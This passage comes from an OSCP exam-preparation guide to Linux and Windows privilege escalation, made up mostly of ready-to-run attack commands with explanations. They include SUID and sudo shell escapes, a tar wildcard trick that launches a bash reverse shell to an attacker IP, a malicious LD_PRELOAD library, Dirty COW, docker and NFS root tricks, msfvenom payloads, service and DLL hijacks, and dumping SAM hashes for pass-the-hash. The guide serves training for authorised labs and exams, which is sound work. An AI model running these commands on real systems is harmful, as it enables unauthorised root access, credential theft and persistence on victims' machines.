    exploit or brute-force the Administrator password if that's viable.
    But if the task runs every 5 minutes or you can manually run it,
    then it's a quick escalation.

Also consider Windows Startup programs: if you have access to write to
`HKLM\Software\Microsoft\Windows\CurrentVersion\Run` or the Startup
folder for All Users, those will run on reboot or login. But in an exam,
you usually can't reboot the machine or get a user to log in, so these
are more persistence techniques than immediate priv esc.

1.  **DLL Hijack opportunities:** If your tools (like PowerUp) flagged a
    missing DLL that a service tries to load, and you can write to that
    location, it's a viable method. It may require writing some C++ code
    for the DLL or using msfvenom to generate a reflective DLL. If
    you're not comfortable, you might skip it. But if nothing else is
    working, you could attempt it as a learning opportunity.

2.  **Credentials and Password Reuse:** If you found any plaintext
    credentials (maybe in an config file or through `findstr` search),
    try them! Perhaps the Administrator account has the same password as
    an SQL service account found in a config. OSCP machines often reward
    those who find creds. Trying `runas /user:Administrator <cmd>` with
    a found password or doing a simple `psexec` or `smbexec` with creds
    could instantly elevate you. Always test any creds you come across,
    for all possible accounts.

3.  **Using Admin Group Membership:** If you discover you are in the
    Administrators group (maybe via a misconfiguration or by exploiting
    something else and adding yourself), but you\'re not SYSTEM, you can
    do a few things:

4.  Use **PsExec** (from Sysinternals or Impacket) to get a SYSTEM shell
    (e.g. `psexec -s -i cmd`).

5.  Schedule a task as SYSTEM
    (`schtasks /create /SC ONCE /TN mytask /TR "cmd.exe /c whoami > C:\out.txt" /RU SYSTEM /ST <time>`
    and set a time one minute in the future).

6.  Use **Token Impersonation** manually: as an admin, you can often
    open Task Manager or some GUI via RDP and it will prompt for
    elevation; in a shell context, you can use
    `powershell Start-Process cmd -Verb runAs` which if UAC is off or
    you supply admin creds, gives elevated shell.

7.  In summary, being admin already typically means you have many ways
    to become SYSTEM, but in OSCP it's usually not needed to go further
    if you own the Administrators group.

8.  **Kernel Exploit (Last Resort):** If none of the above misconfigs
    are present, consider a known local exploit. E.g., if this is a
    Windows 7 or 2008 box missing a certain patch, **MS16-032** is a
    well-known one to try (there\'s a PowerShell and C++ version). If
    Windows 10 but older build, maybe look at known LPEs for that build
    (though newer Windows 10 are quite hardened). As always, be cautious
    using kernel exploits: they might blue-screen the system. If you
    suspect the exam box expects a kernel exploit, it's probably stable
    (OffSec typically uses proven exploits), but double-check any
    documentation on stability.

**Pivoting on Windows:** Windows exploitation might have overlapping
methods. Example: If impersonation privilege is present but your attempt
with JuicyPotato failed, try an alternative tool (e.g. if JuicyPotato
fails on Windows 2019, use **RoguePotato** or **PrintSpoofer** which
uses another
method[\[35\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Use%20tools%20like%20JuicyPotato%2C%20PrintSpoofer%2C,c%20cmd)).
If a service exploit isn\'t working (maybe service won\'t restart or you
lack rights to replace file), try another service or method. **Take
notes of what you try** -- Windows can be finicky, and you don't want to
run the same failing command repeatedly. If at an impasse, running
winPEAS might highlight something you overlooked (like a registry
AutoRun with creds or unattended install file).

In summary, choose the *low-hanging fruit* first. OSCP exam machines
typically have at least one clear weak point. Don\'t spend too long on
one idea if it isn\'t yielding results -- switch gears to another
category. With experience, you\'ll recognize which checks are most
fruitful in given scenarios (this comes from practice, so make sure to
simulate this enumeration on many practice machines).

Now that we\'ve identified various possible paths, let\'s move on to
actually *exploiting* them with the correct commands and techniques.

## Phase 4: Exploitation Commands (with Explanations)

In this phase, we provide concrete exploitation examples for the vectors
identified. Each sub-section will include the scenario, the exact
command(s) to execute, and a brief explanation of what they do and why.

### Linux Privilege Escalation Exploits

Below are common Linux priv-esc scenarios and how to exploit them.
**Always double-check the context** (file paths, names, etc.) before
running commands on the target.

-   **Exploiting SUID Binary:** `find` -- *Scenario:* You found
    `/usr/bin/find` has the SUID bit set (owner is root).\
    **Command:**

```{=html}
<!-- -->
```
-   find /etc/passwd -exec /bin/sh \; 

    **Explanation:** The `find` command has an option to `-exec` another
    program. Because `find` is running as root (due to SUID), this
    executes `/bin/sh` as
    root[\[36\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=find%20Command%20Exploitation%3A).
    Here we arbitrarily use `/etc/passwd` as a target for find (any file
    will do) and then pop a root shell. After running this, use `whoami`
    to confirm you are root. *(Alternate:* `find . -exec whoami \;` will
    print the effective user, which should be
    root[\[36\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=find%20Command%20Exploitation%3A).)
    This technique comes straight from GTFOBins and is one of the
    simplest SUID abuses.

```{=html}
<!-- -->
```
-   **Exploiting SUID Binary:** `nmap` **(Interactive Mode)** --
    *Scenario:* `nmap` is SUID and version is \< 5.21 (which had an
    interactive shell mode).\
    **Command:**

```{=html}
<!-- -->
```
-   nmap --interactive
        nmap> !sh

    **Explanation:** Older nmap had an interactive console where the
    `!sh` command would drop to a
    shell[\[37\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=nmap%20Exploitation%20%28versions%20).
    Because nmap is running as root, this shell is root. Newer versions
    removed `--interactive`, so this only works on legacy installs.
    Check `nmap --version` if unsure.

```{=html}
<!-- -->
```
-   **Exploiting SUID Binary:** `vim`**/**`vi` -- *Scenario:* `vim` is
    SUID (not common on modern systems, but possible in CTFs).\
    **Command:**

```{=html}
<!-- -->
```
-   vim -c ':shell' 

    (Or start vim normally, then in vim command mode type
    `:set shell=/bin/bash` and `:shell`.)\
    **Explanation:** The `-c` flag executes the ex command. Here we
    directly tell vim to open a
    shell[\[38\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=vim%2Fvi%20Exploitation%3A).
    Vim will run this shell with root privileges. If using the
    interactive method: set shell to bash, then `:shell` will spawn that
    shell. You'll have a root shell if vim was SUID.

```{=html}
<!-- -->
```
-   **Exploiting SUID Binary:** `cp` **(overwrite passwd)** --
    *Scenario:* There is a SUID binary (maybe a custom program or even
    `/bin/busybox`) that allows copying files. This is a bit contrived,
    but sometimes an insecure SUID program could allow file writes. As
    an illustrative exploit:\
    **Commands:**

```{=html}
<!-- -->
```
-   echo 'hacker:$6$saltsalt$hashedPW:0:0:root:/root:/bin/bash' > /tmp/passwd  
        cp /tmp/passwd /etc/passwd  

    **Explanation:** This sequence would add a new root user (`hacker`)
    with a known password hash to
    `/etc/passwd`[\[39\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Create%20malicious%20passwd%20file,cp%20%2Ftmp%2Fpasswd%20%2Fetc%2Fpasswd%20su%20hacker).
    The example uses a pre-generated hash (`$6$...` indicates an SHA-512
    password hash). After copying, you could `su hacker` with the
    password you set. However, **you need root privileges to overwrite**
    `/etc/passwd` -- that\'s where the SUID binary comes in. If `cp` is
    SUID (rare), the second command would be executed as root and
    replace the file. In practice, you'd only do this if you have a SUID
    tool that can overwrite arbitrary files (some custom exploit or
    using `tee` with SUID, etc.). This demonstrates the principle of
    overwriting critical files to escalate. (Dirty COW exploit uses a
    similar idea to write to `/etc/passwd` by abusing a race condition.)

```{=html}
<!-- -->
```
-   **Exploiting Sudo: Wildcard in** `tar` -- *Scenario:* `sudo -l`
    shows you can run `/bin/tar -cf /opt/backup.tar *` as root (no
    password). This is vulnerable to a known wildcard expansion
    exploit.\
    **Commands:**

```{=html}
<!-- -->
```
-   cd /opt
        echo 'bash -i >& /dev/tcp/<Kali_IP>/4444 0>&1' > shell.sh     # payload script
        echo "" > "--checkpoint=1"
        echo "--checkpoint-action=exec=bash shell.sh" > "--checkpoint-action=exec=sh shell.sh"
        sudo /bin/tar -cf /opt/backup.tar * 

    **Explanation:** This is a bit complex. Essentially, `tar` has
    command-line options `--checkpoint` and `--checkpoint-action` which
    can execute a command during archiving. By crafting files named
    exactly as those options, we trick tar into executing our `shell.sh`
    when it
    runs[\[40\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Wildcard%20Exploitation%3A).
    In steps: we create a malicious script `shell.sh` (here using a
    reverse shell payload for demonstration; could also add user to
    sudoers as in the PDF example). Then we create empty files named
    `"--checkpoint=1"` and `"--checkpoint-action=exec=sh shell.sh"`.
    When tar runs with `*`, it will include these files as arguments and
    interpret them as options, thus executing the shell script as
    root[\[40\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Wildcard%20Exploitation%3A).
    This yields a root shell (or adds you to sudoers, etc., depending on
    the script).

```{=html}
<!-- -->
```
-   **Exploiting Sudo:** `less` **Editor Escape** -- *Scenario:* You can
    run `sudo less /var/log/auth.log` (or any file) as root. `less` is a
    pager that allows shell escape.\
    **Commands:**

```{=html}
<!-- -->
```
-   sudo less /var/log/auth.log
        !sh

    **Explanation:** When `less` opens, press `!` (bang) to drop to a
    shell, or use the built-in command to launch an editor (like `v`
    for vi) then escape to
    shell[\[41\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20sudo%20allows%3A%20%2Fbin%2Fless%20%2Fvar%2Flog%2F,a%3E%20%3A%21%2Fbin%2Fsh).
    In our example, typing `!sh` from within less will spawn a root
    shell. This works because `less` is running as root and provides a
    shell escape.

*Alternate:* Some versions require pressing `v` to open the default
editor (which might be `vi`), then using `:!sh`. Either way, you get a
shell. Many programs with sudo privileges (especially text editors or
file viewers) can be escaped like this (see GTFOBins for each).

-   **Exploiting Sudo: Preserved Environment (LD_PRELOAD)** --
    *Scenario:* `sudo -l` shows you can run some command with `env_keep`
    or `-E` (preserve environment) option. One common trick: if you can
    run `sudo -E <any command>`, and you can influence `LD_PRELOAD` or
    `LD_LIBRARY_PATH`, you can load a malicious library to execute code
    as root.\
    **Commands (conceptual):**\
    On attacker (Kali), prepare a small C program that spawns a shell
    (`.so` library that runs on load). For example:

```{=html}
<!-- -->
```
-   // malicious.c
        #include <stdio.h>
        __attribute__((constructor)) void run() { setuid(0); system("/bin/bash"); }

    Compile it for target (`gcc -shared -fPIC malicious.c -o shell.so`).
    Transfer `shell.so` to target. Then run:

        sudo LD_PRELOAD=/path/to/shell.so -E <some_command>

    The `<some_command>` can be anything that will cause the library to
    load (even `/bin/true`). The `sudo -E` keeps LD_PRELOAD in
    environment[\[42\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Environment%20Variable%20Abuse%3A),
    and if not restricted by secure_path, it will load our `shell.so`
    and execute the constructor, popping a root shell.\
    **Explanation:** Normally, `sudo` sanitizes dangerous environment
    variables like `LD_PRELOAD`, but if the target binary is not setuid
    or if the configuration is lax, this can slip through. This is an
    advanced method and may not always work on OSCP exam boxes (which
    often require simpler approaches). But it\'s good to mention as part
    of environment variable abuse.

```{=html}
<!-- -->
```
-   **Exploiting Cron Job (Writable Script)** -- *Scenario:* You found a
    cron job, running as root, that executes a script file every minute.
    The script is located in, say, `/usr/local/bin/backup.sh` and is
    world-writable.\
    **Commands:**

```{=html}
<!-- -->
```
-   echo '#!/bin/bash' > /usr/local/bin/backup.sh
        echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh

    Now wait for a minute (or however long the interval). After it runs:

        /tmp/rootbash -p

    **Explanation:** We replaced the backup script with one that copies
    `/bin/bash` to `/tmp/rootbash` and sets the SUID bit on
    it[\[43\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20cron%20script%20is%20writable,p).
    When the cron daemon (running as root) executes the script, it
    creates a root-owned SUID bash shell at `/tmp/rootbash`. The `-p`
    option when running a SUID binary like bash means \"do not drop
    privileges\". So `/tmp/rootbash -p` gives you a root
    shell[\[44\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=echo%20%27,p).
    After confirming it worked (`whoami` -\> root), you can optionally
    clean up (remove /tmp/rootbash and restore the original script if
    needed for stealth).

Another cron scenario: sometimes instead of a script, a cron job might
run a command that you can influence via PATH (as discussed) or by
editing a config file it uses. Adapt your approach accordingly.

-   **Kernel Exploit: Dirty COW (CVE-2016-5195)** -- *Scenario:* Target
    is running an older Linux kernel vulnerable to Dirty COW (common on
    unpatched Ubuntu 16.04/14.04, etc.). No easy misconfigs found, so
    you resort to this exploit.\
    **Commands:**\
    First, transfer the Dirty COW C code (`dirty.c`) to target
    (available via searchsploit). Then on target:

```{=html}
<!-- -->
```
-   gcc -pthread dirty.c -o dirty -lcrypt[23]
        ./dirty secret123

    **Explanation:** The Dirty COW exploit by Firefart creates a new
    user (often named `firefart`) with UID 0 and password \"secret123\"
    (as provided in
    argument)[\[45\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Compile%20and%20run%20dirty%20cow,a).
    After running it, you switch to the new user:
        su firefart
        Password: secret123

    And you should be root (check `id`). The exploit works by exploiting
    a race condition in the kernel\'s memory management to write to
    `/etc/passwd`. It\'s stable in that it usually either works or
    doesn\'t, without crashing. Always test compiled exploits in a
    similar environment if possible.

Another kernel exploit example is **OverlayFS (CVE-2015-1328)**,
exploited similarly by compiling and running
code[\[46\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Overlayfs%20%28CVE).
Each exploit may have its own steps, so read any documentation in the
code comments or accompanying blog.

-   **Exploiting Capabilities: Python Cap_setuid** -- *Scenario:*
    `getcap` showed `/usr/bin/python3.5 = cap_setuid+ep` (for example).\
    **Command:**

```{=html}
<!-- -->
```
-   python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

    **Explanation:** This Python one-liner uses the `cap_setuid`
    capability to change the UID of the process to 0 (root), then spawns
    a bash
    shell[\[18\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Common%20dangerous%20capabilities%3A%3Ca%3E%3C%2Fa%3E%20cap_setuid%20,a).
    Normally, a non-root user can\'t change its UID to 0, but the file
    capability grants that power to the Python binary. When we invoke
    it, it effectively gives us a root shell. This is extremely powerful
    and often overlooked. Other capabilities exploitation: if `perl` had
    cap_setuid, we could do similar in Perl. If `cap_dac_read_search` is
    set on some binary, you could read any file (not immediate root, but
    could read shadow file to crack password, etc.).

```{=html}
<!-- -->
```
-   **Exploiting Docker Group:** -- *Scenario:* You are in the `docker`
    group on the target. Docker is installed and the daemon is running.\
    **Command:**\
    From your low-priv shell, run:

```{=html}
<!-- -->
```
-   docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash

    **Explanation:** This command starts a new Docker container using
    the Alpine Linux image. It mounts the host root filesystem (`/`) to
    the container at `/mnt`. Then it uses `chroot /mnt /bin/bash` to
    change the container\'s root to the host\'s root, and launches bash.
    The result: a root shell on the host system. This works because the
    docker group allows you to control the docker daemon, which is
    effectively
    root-equivalent[\[21\]](https://medium.com/@kankojoseph/from-containers-to-host-privilege-escalation-techniques-in-docker-487fe2124b8e#:~:text=From%20Containers%20to%20Host%3A%20Privilege,to%20carry%20out%20your).
    If Alpine image isn\'t available, you might have to load an image.
    In OSCP labs, internet is not accessible from target, but Docker
    often has default images or you can import one via a saved file.
    Alternatively, you can run any container already on the system. The
    key is mounting the host file system. If using `alpine` isn\'t
    possible, another trick: `docker save -o alpine.tar alpine:latest`
    on your machine, transfer `alpine.tar` and
    `docker load -i alpine.tar` on target, then run above. The command
    given assumes you can do all that. In practice, this is a quick
    method if set up; otherwise, you might go for the next approach (LXD
    if available, or just find another vector). The takeaway: *in docker
    group = immediate root*, so it\'s worth the effort.

```{=html}
<!-- -->
```
-   **Exploiting NFS no_root_squash:** -- *Scenario:* An NFS share is
    exported with `no_root_squash`, and you can mount it from your Kali.
    For example, `/export (rw,no_root_squash)` is accessible.\
    **Commands (on Kali attacker):**

```{=html}
<!-- -->
```
-   mkdir /tmp/nfs_mount
        mount -t nfs <targetIP>:/export /tmp/nfs_mount
        echo 'int main(){setuid(0); setgid(0); system("/bin/bash");}' > /tmp/nfs_mount/root.c
        gcc /tmp/nfs_mount/root.c -o /tmp/nfs_mount/rootme
        chmod +s /tmp/nfs_mount/rootme

    (Now unmount if needed, though not necessary.)\
    **Commands (back on target):**

        /export/rootme

    **Explanation:** By mounting the NFS share with no_root_squash, any
    files created as root on the client (Kali) will also be owned by
    root on the server. We create a simple C program that spawns a root
    shell (via SUID
    technique)[\[47\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=echo%20%27int%20main%28%29%7Bsetgid%280%29%3B%20setuid%280%29%3B%20system%28,a%3E%20%2Fpath%2Fto%2Fmounted%2Fx),
    compile it on the share (as root user on Kali, so the file has UID 0
    on server), and set the SUID bit. When we execute `/export/rootme`
    on the target, it is running as an SUID-root binary, giving a root
    shell. This works because no_root_squash *does not downgrade the
    root user* on the mounted share, which is normally a security
    measure (root would be mapped to nobody by default root_squash).
    This is a classic priv esc if NFS is open.

These examples cover many of the real-world vectors seen in OSCP labs:
leveraging SUID binaries, misconfigured sudo, cron jobs, capabilities,
containers, etc. Always tailor the command to the situation (paths, file
names, IP addresses for reverse shells, etc. will differ).

### Windows Privilege Escalation Exploits

Now let\'s cover exploitation on Windows for the common scenarios:

-   **Token Impersonation: JuicyPotato / PrintSpoofer** -- *Scenario:*
    You have `SeImpersonatePrivilege`. The target is Windows Server 2016
    or earlier (for JuicyPotato) or a newer Windows where PrintSpoofer
    works (requires SMB or Spooler service).\
    **Command (PrintSpoofer example):**\
    On your Kali, ensure you have `PrintSpoofer.exe` (a tool to exploit
    SeImpersonate via print spooler). Transfer it to target. Then on
    target:

```{=html}
<!-- -->
```
-   PrintSpoofer.exe -i -c cmd

    **Explanation:** The `-i` flag tells it to interactively spawn a
    process, and `-c cmd` means launch `cmd.exe` as the elevated
    process. Running this will grant a new shell as NT
    AUTHORITY\\SYSTEM[\[24\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows%20tokens%20represent%20security%20context,and%20can%20sometimes%20be%20impersonated)[\[35\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Use%20tools%20like%20JuicyPotato%2C%20PrintSpoofer%2C,c%20cmd).
    It\'s near-instant. JuicyPotato works similarly but requires
    specifying CLSIDs; PrintSpoofer is simpler and works on many newer
    systems (up to when RPC Mapper was closed). If PrintSpoofer doesn't
    work (maybe the Spooler service is off), try **RoguePotato** or
    **SweetPotato** depending on OS version. Each of these tools might
    have slightly different usage, but they all result in a SYSTEM
    shell. The bottom line: with impersonation privileges, these tools
    abuse a privileged COM service to get
    SYSTEM[\[24\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Windows%20tokens%20represent%20security%20context,and%20can%20sometimes%20be%20impersonated).
    This is a *must-know* technique for OSCP.

```{=html}
<!-- -->
```
-   **AlwaysInstallElevated: MSI Install** -- *Scenario:* Both registry
    values for AlwaysInstallElevated are 1 (enabled).\
    **Commands:**\
    On Kali, generate a malicious MSI. For example, to add a new local
    admin user:

```{=html}
<!-- -->
```
-   msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi-nouac -o evil.msi

    This payload will create user \"hacker\" with password \"Passw0rd!\"
    and add to Administrators group. Transfer `evil.msi` to target (e.g.
    via `powershell -c (New-Object Net.WebClient).DownloadFile(...)`).
    Then on target, run:

        msiexec /quiet /qn /i C:\path\to\evil.msi

    **Explanation:** `msiexec` will execute the MSI with elevated
    privileges[\[48\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=To%20establish%20a%20reverse%20shell,can%20accomplish%20this%20using%20msfvenom)[\[49\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=your%20attacking%20machine,to%20establish%20the%20desired%20connection).
    The flags `/quiet /qn` make it silent. After it finishes, the new
    user is created as an admin. You can then `runas /user:hacker cmd`
    (enter Passw0rd!) to open an Administrator shell, or use that
    account to RDP if allowed. Alternatively, you could have the MSI
    launch a reverse shell to you (using a `shell_reverse_tcp` payload
    as shown in the Medium
    article)[\[50\]](https://medium.com/@persecure/windows-privilege-escalation-alwaysinstallelevated-8e83f7d1bbc6#:~:text=msfvenom%20,o%20evil.msi),
    which might be quicker. AlwaysInstallElevated essentially lets *any*
    user run an installer as
    SYSTEM[\[31\]](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/#:~:text=%28AlwaysInstallElevated%29%20www,be%20installed%20with%20administrative%20privileges),
    so it\'s a direct path. Just note: cleaning up might involve
    removing the created user after.

```{=html}
<!-- -->
```
-   **Service Binary Replacement (Weak Service Permissions):** --
    *Scenario:* A service running as SYSTEM has an executable in a path
    that you can write to (you confirmed with icacls or AccessChk that
    you have Full access on the .exe). Example: ServiceName =
    \"VulnService\", Path = `C:\Program Files\Vuln\service.exe`, and
    `C:\Program Files\Vuln\service.exe` has Users:F permission.\
    **Commands:**

-   Prepare a malicious EXE. For instance, on Kali use
    `msfvenom -p windows/x64/exec CMD="net localgroup administrators <yourUser> /add" -f exe -o hijack.exe`.
    This payload when run will add your low-priv user to the
    Administrators group (as a simple escalation). Or choose to pop a
    reverse shell. Transfer `hijack.exe` to the target, e.g. as
    `C:\Users\Public\hijack.exe`.

-   Stop the service (if you have rights): `sc stop VulnService` (or use
    `net stop`). If you cannot stop it, sometimes a reboot will start
    your payload if you replaced it -- but rebooting is risky in exam.
    Let's assume you can stop it or the service is not running
    continuously.

-   **Replace the binary:** Rename the original `service.exe` to
    `service.exe.bak` (just in case) and move your `hijack.exe` into its
    place:

```{=html}
<!-- -->
```
-   move C:\Program Files\Vuln\service.exe C:\Program Files\Vuln\service.exe.bak
        copy C:\Users\Public\hijack.exe "C:\Program Files\Vuln\service.exe"

```{=html}
<!-- -->
```
-   Start the service: `sc start VulnService` (or
    `net start VulnService`).\
    **Explanation:** When the service starts, it will execute your
    `service.exe` (which is actually your payload) as
    SYSTEM[\[28\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=NT%20AUTHORITY)[\[30\]](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html#:~:text=Restart%20the%20Service).
    If the payload adds you to Administrators, you can then re-login as
    an admin or use any admin action to confirm. If it's a reverse
    shell, you'll get a SYSTEM shell back on Kali. This is one of the
    most straightforward and reliable methods if available. *Note:* Some
    services auto-restart on failure, so even if you can\'t stop it
    gracefully, you might crash it and hope the service controller
    restarts it (not elegant, though).

-   **Unquoted Service Path (Path Hijack):** -- *Scenario:* A service
    has an unquoted path with a space, e.g.
    `C:\Program Files\Unquoted Path Service\Common Files\UnquotedService.exe`.
    You cannot modify the service or binary directly, but you *can*
    create files in `C:\` or `C:\Program Files\Unquoted Path Service\`
    which are writable.\
    **Commands:**\
    Let's say `C:\` is writable by Users (often it is not, but sometimes
    in CTFs it might be). You would create an executable at
    `C:\Program.exe`. For example, use the same `hijack.exe` from above
    or a simpler
    `msfvenom -p windows/shell_reverse_tcp ... -f exe -o Program.exe`.
    Place this in `C:\`. Then restart the vulnerable service (or wait
    for reboot).\
    **Explanation:** Because the service path isn't quoted, Windows will
    try `C:\Program.exe` first. When you restart the service, instead of
    launching the real service, it will run your `Program.exe` as
    SYSTEM. This gives you a shell or adds you to admins. The true
    service fails to start (since your Program.exe likely exits after
    payload), but by then you have what you need. Ensure the service's
    StartMode is auto or manual appropriately; you might use `sc start`
    as a normal user if you have the rights (not usually, unless you\'re
    in the Backup Operators or similar roles that can start services).
    Often, exploiting unquoted path needs a reboot or a system
    auto-start, unless you *also* have some permission to start/stop the
    service. In an exam, you could gently ask the exam proctors if a
    reboot is allowed (but usually, they discourage it). So this is
    effective if you can start the service or if the service runs
    periodically.

-   **Modifying Service ImagePath via Registry:** -- *Scenario:* You
    discovered you have write access to a service's registry config
    (e.g. `HKLM\SYSTEM\CurrentControlSet\Services\VulnService`).\
    **Commands:**\
    Using PowerShell (which bypasses some quoting issues):

```{=html}
<!-- -->
```
-   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" -Name ImagePath -Value "C:\Users\Public\payload.exe"

    Then start the service:

        sc start VulnService

    **Explanation:** We change the ImagePath to point to our payload.
    Next time the service starts, it will launch our payload as SYSTEM.
    This is similar to binary replacement, but instead of replacing the
    file (which we might not have permission to), we redirect the
    service to a new executable we control. This technique is part of
    what tools like *PowerUp* check (e.g., *modifiable services*).
    Always ensure the data types and paths are correct in registry
    (ImagePath is a REG_EXPAND_SZ or REG_SZ). If successful, once you
    get SYSTEM, restore the original ImagePath to avoid detection.

```{=html}
<!-- -->
```
-   **Abusing SeBackupPrivilege:** -- *Scenario:* Your user has
    SeBackupPrivilege (check via `whoami /priv`). This allows reading
    any file as if you were a backup agent. By using the Windows Backup
    API (via Robocopy or built-in commands), you can copy protected
    files like the SAM database.\
    **Commands (copy SAM and SYSTEM hives):**

```{=html}
<!-- -->
```
-   reg save HKLM\SAM C:\Users\Public\SAM.backup
        reg save HKLM\SYSTEM C:\Users\Public\SYSTEM.backup

    (If reg save is denied, use robocopy which honors backup privilege:)

        robocopy C:\Windows\System32\config C:\Users\Public\SAMcopy SAM SYSTEM /b[25]

    **Explanation:** The `/b` flag in robocopy uses Backup
    mode[\[25\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=SeBackupPrivilege%3A).
    This will copy the SAM and SYSTEM registry hives, which contain user
    password hashes and the system key. Once you have these files
    (SAM.backup & SYSTEM.backup), you can use a tool like \*\*
    secretsdump.py **(Impacket) or** pwdump / mimikatz **offline to
    extract Administrator\'s hash or password. For example, transfer
    those files to Kali and run**
    `secretsdump -sam SAM.backup -system SYSTEM.backup LOCAL`**. If you
    retrieve the local Administrator NTLM hash, you can**
    pass-the-hash\*\* using
    `psexec.py administrator@target -hashes <hash>` to get a SYSTEM
    shell, or crack the hash if it\'s weak. Essentially,
    SeBackupPrivilege gives read access to any file, which we use to
    steal credentials. This isn\'t an immediate one-command root, but
    it\'s a viable path. Don't forget to also consider
    SeRestorePrivilege (you could restore an altered SAM, but that's
    more complex and dangerous).

```{=html}
<!-- -->
```
-   **Scheduled Task Hijack:** -- *Scenario:* A scheduled task named
    \"NightlyBackup\" runs as SYSTEM and calls `C:\Scripts\backup.bat`.
    You have confirmed `C:\Scripts\backup.bat` is writable by standard
    users.\
    **Commands:**\
    Append a command to the script:

```{=html}
<!-- -->
```
-   echo net localgroup administrators %USERNAME% /add >> C:\Scripts\backup.bat

    Wait for the task to run at its scheduled time or force run it if
    possible:

        schtasks /Run /TN "NightlyBackup"

    **Explanation:** We add a line that adds our current user to the
    Administrators
    group[\[33\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=If%20task%20script%20is%20writable,C%3A%5Cpath%5Cto%5Ctask%5Cscript.bat).
    When the scheduled task triggers (running as SYSTEM), it executes
    the modified batch file and thereby elevates our user. We can then
    open a new command prompt and have admin rights. If we can\'t force
    the task to run and it runs, say, in a few hours, that's a problem
    if time is short. In such a case, better to try another method or
    see if you can change the trigger (probably not without admin
    rights). Scheduled tasks often have predictable times; some CTF
    tasks run every minute or 5 minutes for convenience.

```{=html}
<!-- -->
```
-   **DLL Hijacking (Missing DLL):** -- *Scenario:* A service
    \"AuthService\" runs as SYSTEM and tries to load
    `C:\Program Files\AuthApp\libs\crypto.dll`, but that file is
    missing. We have write access to `C:\Program Files\AuthApp\libs\`.\
    **Commands:**\
    Write a malicious DLL (compiled on Kali, named exactly
    `crypto.dll`). For example, use the provided C code template to
    execute a
    payload[\[51\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=%2F%2F%20malicious,return%20TRUE%3B).
    Compile with MinGW. Transfer `crypto.dll` to target and place it in
    `C:\Program Files\AuthApp\libs\`. Then restart the service (or wait
    for it to restart).\
    **Explanation:** The service will load our `crypto.dll` as SYSTEM.
    In the DLL code, DllMain\'s attach should execute a command (like
    spawn a reverse shell or create a new
    user)[\[51\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=%2F%2F%20malicious,return%20TRUE%3B).
    Once triggered, we get SYSTEM. This technique requires knowing what
    DLL is missing; often, you\'ll find this by using **ProcMon** on the
    service (it will show \"NAME NOT FOUND\" for the missing
    DLL)[\[34\]](file://file_00000000a3d0620a84e217ba9230a1d3#:~:text=Use%20Process%20Monitor%20to%20identify,AllChecks).
    The OSCP exam might not heavily focus on custom DLL hijacks unless
    hinted; but some practice machines do. The key is: if a high-priv
    program loads a DLL from a directory you can write to, you can
    hijack that DLL. Tools like *PowerUp* (`Invoke-AllChecks`) list such
    opportunities (look for \"Missing DLL\" or \"Potential DLL Hijack\"
    in its output).

-   **Writable PATH (Exe/dll Hijack):** -- *Scenario:* The system PATH
    includes `C:\xampp\php\` and that directory is Everyone:F (fully
    writable). A service or user runs a command without full path (for
    example, running `php.exe` which might search PATH).\
    **Exploit Concept:** If a service or scheduled task calls `php` by
    name, it will search through PATH. You can place a malicious
    `php.exe` or similarly named binary in the writable PATH directory
    so that it gets invoked first. This scenario is less direct, because
    you need to know what command will be run. Another example is if
    PATH is writable and an Administrator manually runs some common
    command like `find.exe`, you could put a trojaned find.exe in the
    PATH. This relies on chance/timing and is not guaranteed in an exam
    environment unless explicitly set up.

-   **UAC Bypass (if Admin but high integrity needed):** -- *Scenario:*
    You compromised a user in the Administrators group but only have a
    medium integrity shell (UAC is enabled). While OSCP doesn't
    emphasize UAC bypass, one quick method:\
    **Command:**

```{=html}
<!-- -->
```
-   powershell -c "Start-Process cmd -Verb runAs"

    This will prompt the GUI for consent (not helpful remotely without
    GUI). If you have RDP or WinRM access, you might approve it.
    Alternatively, use a known UAC bypass script (like the Fodhelper
    registry method or eventvwr.exe bypass). Given OSCP context, it\'s
    rare to need this because typically the goal is either user to NT
    AUTHORITY\\SYSTEM or nothing -- being a member of Administrators is
    already enough for the objective. But if you do encounter a
    Protected Admin scenario, mention in your notes that you might
    bypass UAC by known techniques (like adding a registry key for
    auto-elevating executables).

Each of these exploitation steps should be done carefully and one at a
time. On Windows, it\'s wise to take a **snapshot of the system (if in a
VM lab)** or at least note original settings (like original service
ImagePath) in case you need to revert it. In the OSCP exam, you don\'t
need to revert changes, but in real life or lab practice, be courteous.

Let\'s move on to final phase -- cleanup and verification, and then a
summary checklist.

